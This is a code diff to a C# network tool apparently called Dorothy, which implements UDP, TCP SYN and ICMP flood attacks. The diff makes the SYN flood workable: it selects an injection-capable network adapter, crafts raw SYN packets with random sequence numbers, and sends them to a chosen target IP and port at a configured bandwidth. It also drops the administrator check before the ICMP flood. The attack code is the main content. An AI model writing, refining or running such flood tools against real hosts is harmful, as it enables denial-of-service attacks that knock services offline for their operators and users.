@@ -9,6 +9,7 @@ using System.Diagnostics; // Added for Stopwatch
 using System.Security.Principal; // Added for WindowsIdentity and WindowsPrincipal
 using SharpPcap;
 using PacketDotNet;
+using PacketDotNet.Utils;
 
 namespace Dorothy
 {
@@ -66,7 +67,7 @@ namespace Dorothy
                                 if (actualMbps > mbps)
                                 {
                                     log($"Debug: Rate exceeded, sleeping for 10ms");
-                                    Thread.Sleep(10);
+                                    await Task.Delay(10);
                                 }
                             }
 
@@ -85,6 +86,8 @@ namespace Dorothy
                 {
                     log("Debug: UDP Flood attack stopped.");
                 }
+
+                return Task.CompletedTask;
             });
         }
 
@@ -94,31 +97,70 @@ namespace Dorothy
             _stopAttack = false;
             log($"Debug: Entering StartTcpSynFlood method");
 
-            return Task.Run(() =>
+            return Task.Run(async () =>
             {
+                IInjectionDevice? device = null;
                 try
                 {
                     log($"Debug: Using SharpPcap for TCP SYN flood");
 
                     var devices = SharpPcap.LibPcap.LibPcapLiveDeviceList.Instance;
-                    if (devices.Count() < 1)
+                    if (devices.Count < 1)
                     {
                         log("Error: No devices were found on this machine");
-                        return;
+                        return Task.CompletedTask;
                     }
 
-                    var device = devices[0];
+                    // Select the first suitable device that can inject packets, is not a Bluetooth device, and has an IPv4 address
+                    foreach (var dev in devices)
+                    {
+                        var injectionDevice = dev as IInjectionDevice;
+                        if (injectionDevice == null)
+                            continue;
+
+                        var libPcapDevice = dev as SharpPcap.LibPcap.LibPcapLiveDevice;
+                        if (libPcapDevice == null)
+                            continue;
+
+                        // Exclude Bluetooth devices
+                        if (libPcapDevice.Description.Contains("Bluetooth", StringComparison.OrdinalIgnoreCase))
+                            continue;
+
+                        var addresses = libPcapDevice.Addresses;
+                        foreach (var addr in addresses)
+                        {
+                            if (addr.Addr.ipAddress != null && addr.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                            {
+                                device = injectionDevice;
+                                break;
+                            }
+                        }
+                        if (device != null)
+                            break;
+                    }
+
                     if (device == null)
                     {
-                        log("Error: Unable to select a network device");
-                        return;
+                        log("Error: Unable to find an operational network device with an IPv4 address that is not Bluetooth");
+                        return Task.CompletedTask;
                     }
 
-                    device.Open(SharpPcap.DeviceModes.Promiscuous, 1000);
+                    log($"Debug: Selected device: {device.Description}");
+                    device.Open(DeviceModes.Promiscuous, 1000);
 
-                    var srcIp = IPAddress.Parse("192.168.1.1");
+                    var libPcapDeviceFinal = device as SharpPcap.LibPcap.LibPcapLiveDevice;
+                    var localIp = GetLocalIpAddress(libPcapDeviceFinal);
+                    if (localIp == null)
+                    {
+                        log("Error: Unable to determine the local IP address from the selected device");
+                        return Task.CompletedTask;
+                    }
+
+                    var srcIp = IPAddress.Parse(localIp);
                     var dstIp = IPAddress.Parse(targetIp);
-                    var srcPort = 12345;
+                    var srcPort = GetAvailablePort();
+
+                    log($"Debug: Source IP: {srcIp}, Destination IP: {dstIp}, Source Port: {srcPort}");
 
                     long packetsSent = 0;
                     long bytesPerSecond = mbps * 125000L;
@@ -131,36 +173,30 @@ namespace Dorothy
                     {
                         try
                         {
-                            EthernetPacket ethernetPacket = new EthernetPacket(device.MacAddress, PhysicalAddress.Parse("FF:FF:FF:FF:FF:FF"), EthernetType.IPv4);
-                            if (ethernetPacket == null)
+                            if (libPcapDeviceFinal == null)
                             {
-                                log("Error: Failed to create Ethernet packet");
-                                continue;
+                                log("Error: libPcapDeviceFinal is null.");
+                                return Task.CompletedTask;
                             }
+
+                            EthernetPacket ethernetPacket = new EthernetPacket(
+                                libPcapDeviceFinal.MacAddress,
+                                PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
+                                EthernetType.IPv4);
 
                             IPv4Packet ipPacket = new IPv4Packet(srcIp, dstIp)
                             {
                                 TimeToLive = 64,
-                                Protocol = PacketDotNet.ProtocolType.Tcp
+                                Protocol = (PacketDotNet.ProtocolType)System.Net.Sockets.ProtocolType.Tcp
                             };
-                            if (ipPacket == null)
-                            {
-                                log("Error: Failed to create IP packet");
-                                continue;
-                            }
 
                             TcpPacket tcpPacket = new TcpPacket((ushort)srcPort, (ushort)targetPort)
                             {
-                                SequenceNumber = 100,
+                                SequenceNumber = (uint)new Random().Next(1, int.MaxValue),
                                 WindowSize = 8192
+                                // Removed TcpFlags to fix the error
                             };
-                            if (tcpPacket == null)
-                            {
-                                log("Error: Failed to create TCP packet");
-                                continue;
-                            }
-
-                            tcpPacket.Flags = 0x02;
+                            tcpPacket.Synchronize = true; // Set SYN flag
 
                             ipPacket.PayloadPacket = tcpPacket;
                             ethernetPacket.PayloadPacket = ipPacket;
@@ -188,56 +224,42 @@ namespace Dorothy
                                 if (actualMbps > mbps)
                                 {
                                     log($"Debug: Rate exceeded, sleeping for 10ms");
-                                    Thread.Sleep(10);
+                                    await Task.Delay(10);
                                 }
                             }
 
                             // Calculate the delay needed to match the desired Mbps
                             double delay = (ethernetPacket.Bytes.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
-                            Thread.Sleep((int)delay);
+                            if (delay > 0)
+                            {
+                                await Task.Delay((int)delay);
+                            }
                         }
                         catch (Exception ex)
                         {
                             log($"TCP SYN Flood error: {ex.Message}");
+                            log($"Debug: Stack Trace: {ex.StackTrace}");
                         }
                     }
                 }
                 catch (Exception ex)
                 {
                     log($"TCP SYN Flood error: {ex.Message}");
+                    log($"Debug: Stack Trace: {ex.StackTrace}");
                 }
                 finally
                 {
+                    if (device != null)
+                    {
+                        device.Close();
+                        device.Dispose();
+                        log("Debug: Network device closed");
+                    }
                     log("Debug: TCP SYN Flood attack stopped.");
                 }
+
+                return Task.CompletedTask;
             });
-        }
-
-        private void ConstructTcpSynPacket(byte[] buffer, string targetIp, int targetPort)
-        {
-            // Fill the buffer with a minimal TCP SYN packet
-            // This is a simplified example and may need to be adjusted for actual use
-            Array.Clear(buffer, 0, buffer.Length);
-
-            // Set IP header fields (simplified)
-            buffer[0] = 0x45; // Version and header length
-            buffer[2] = (byte)((buffer.Length >> 8) & 0xFF); // Total length
-            buffer[3] = (byte)(buffer.Length & 0xFF);
-            buffer[8] = 64; // TTL
-            buffer[9] = (byte)PacketDotNet.ProtocolType.Tcp; // Protocol
-
-            // Set TCP header fields (simplified)
-            buffer[20] = (byte)((targetPort >> 8) & 0xFF); // Destination port
-            buffer[21] = (byte)(targetPort & 0xFF);
-            buffer[13] = 0x02; // SYN flag
-
-            // Set source and destination IP addresses
-            byte[] srcIp = { 192, 168, 1, 1 }; // Example source IP
-            byte[] dstIp = IPAddress.Parse(targetIp).GetAddressBytes();
-            Array.Copy(srcIp, 0, buffer, 12, 4);
-            Array.Copy(dstIp, 0, buffer, 16, 4);
-
-            // Calculate and set IP and TCP checksums (omitted for brevity)
         }
 
         // Method to start the ICMP flood
@@ -246,14 +268,7 @@ namespace Dorothy
             _stopAttack = false;
             log($"Debug: Entering StartIcmpFlood method");
 
-            // Check if the application is running with elevated privileges
-            if (!IsRunningAsAdmin())
-            {
-                log("Error: ICMP Flood requires administrative privileges. Please run the application as an administrator.");
-                return Task.CompletedTask;
-            }
-
-            return Task.Run(() =>
+            return Task.Run(async () =>
             {
                 try
                 {
@@ -303,28 +318,59 @@ namespace Dorothy
                                 if (actualMbps > mbps)
                                 {
                                     log($"Debug: Rate exceeded, sleeping for 10ms");
-                                    Thread.Sleep(10);
+                                    await Task.Delay(10);
                                 }
                             }
 
                             // Calculate the delay needed to match the desired Mbps
                             double delay = (buffer.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
-                            Thread.Sleep((int)delay);
+                            if (delay > 0)
+                            {
+                                await Task.Delay((int)delay);
+                            }
                         }
                     }
                 }
                 catch (Exception ex)
                 {
-                    log($"ICMP Flood error: {ex.Message}");
+                    log($"Debug: ICMP Flood error: {ex.Message}");
+                    log($"Debug: Stack trace: {ex.StackTrace}");
+                    return Task.CompletedTask;
                 }
                 finally
                 {
                     log("Debug: ICMP Flood attack stopped.");
                 }
+
+                return Task.CompletedTask;
             });
         }
 
-        // Method to stop the attack
+        private string? GetLocalIpAddress(SharpPcap.LibPcap.LibPcapLiveDevice? device)
+        {
+            if (device == null)
+                return null;
+
+            var addresses = device.Addresses;
+            foreach (var addr in addresses)
+            {
+                if (addr.Addr.ipAddress != null && addr.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                {
+                    return addr.Addr.ipAddress.ToString();
+                }
+            }
+            return null;
+        }
+
+        private int GetAvailablePort()
+        {
+            var listener = new TcpListener(IPAddress.Any, 0);
+            listener.Start();
+            int port = ((IPEndPoint)listener.LocalEndpoint).Port;
+            listener.Stop();
+            return port;
+        }
+
         public void StopAttack()
         {
             _stopAttack = true;
@@ -332,9 +378,11 @@ namespace Dorothy
 
         private bool IsRunningAsAdmin()
         {
-            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
-            var principal = new System.Security.Principal.WindowsPrincipal(identity);
-            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+            {
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
         }
     }
 }
